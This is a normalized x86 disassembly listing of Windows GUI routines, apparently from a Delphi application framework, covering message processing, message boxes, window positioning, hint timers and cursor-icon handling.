jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43468c
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_43df6c
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_456a80
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_4579e0
sub_456ab4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_43df6c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403490
test al al
jne r-xdata
sub_456b20
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_456a80
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_456978
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4569c8
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_456954
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_456bb8
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_456b20
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_457488
sub_456bdc
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_414150
mov eax 0x8
call sub_4026e4
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_414014
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_456c38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_414170
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_402704
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_414060
jmp r-xdata
sub_456ccc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_456d0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_43df48
mov [ esi + 0x44 ] edi
sub_456d4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_456e2a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_44dc54
call sub_407bc0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e31
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_451440
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_40371c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_456bb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_450348
mov eax [ ebp - 0x4 ]
call sub_45671c
jmp r-xdata
sub_456e4c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402774
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_402794
push eax
call sub_402774
pop edx
call sub_40b4c8
call sub_402774
mov edx [ rw-data ]
call sub_403420
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_402774
mov edx eax
mov eax ebx
call sub_457044
pop esi
pop ebx
retn
call sub_402774
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_456edc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_44dcdc
mov [ ebp - 0x10 ] eax
call sub_44dbf8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_455e80
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_457031
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457038
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_44dd90
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_44dc00
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_457044
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4570ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4040e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_456908
mov eax [ ebp - 0x108 ]
call sub_404510
push eax
mov eax [ ebp - 0x4 ]
call sub_404510
mov edx eax
mov eax ebx
pop ecx
call sub_456edc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457106
lea eax [ ebp - 0x108 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp - 0x4 ]
call sub_408458
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d98
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402bb0
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404318
sub_45711c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_43e108
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_43e270
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_4577c0
test al al
je r-xdata
call sub_43df6c
mov ebp eax
mov eax edi
call sub_43df6c
mov ebp eax
mov eax esi
call sub_4577c0
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_457284
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4572dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4577c0
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45800c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4572e3
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_4572ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_457344
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4577c0
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45800c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45734b
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_45735c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403294
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43794c
jmp r-xdata
sub_4573ac
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_454958
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_43df6c
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454944
mov ebx eax
mov eax ebx
call sub_43e270
test al al
je r-xdata
mov eax ebx
call sub_43df6c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_457410
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_436058
mov edi eax
call sub_434954
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_438978
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_438978
sub_457488
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_457598
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_457410
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4554c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_434910
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_457648
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_40371c#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_4579e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4573ac
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41a210
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45759f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404074
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_4575a8
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45493c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_454928
movzx edx di
xor ecx ecx
call sub_438978
inc esi
dec ebx
jne r-xdata
sub_4575e4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_456700
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_456700
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_4575a8
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_457648
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_40445c
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_4040a4
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4316a8
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443db8
xor eax eax
push ebp
push sub_4576cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403294
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_4576dc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_457738
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45493c
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_4576dc
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454928
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4576dc
pop ecx
jmp r-xdata
mov eax ebx
call sub_43e270
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_43df6c
push eax
call IsChild
test eax eax
jne r-xdata
sub_4577c0
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40568c
call sub_4242ec
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_4577e8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_45782c
push sub_455518
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4579e0
sub_457854
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069f0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4372c4
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_436058
call sub_4554f8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4579e0
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069f0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_4372c4
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4579e0
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_4577e8
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_438978
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_457c78
jmp r-xdata
sub_457964
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45782c
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_457c78
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45799c
jmp r-xdata
sub_45799c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43e270
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_43df6c
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_43df6c
push eax
call ShowWindow
sub_4579e0
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45799c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_455680
mov eax ebx
call sub_45782c
sub_457a18
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_457b5a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41fb80
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407b74
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_457b2b
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41fc38
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457b32
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_402704
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_457a08
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_457a08
mov [ ebp - 0x4 ] eax
sub_457b32
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_457b6c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403294
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031dc
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_457bcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_457c66
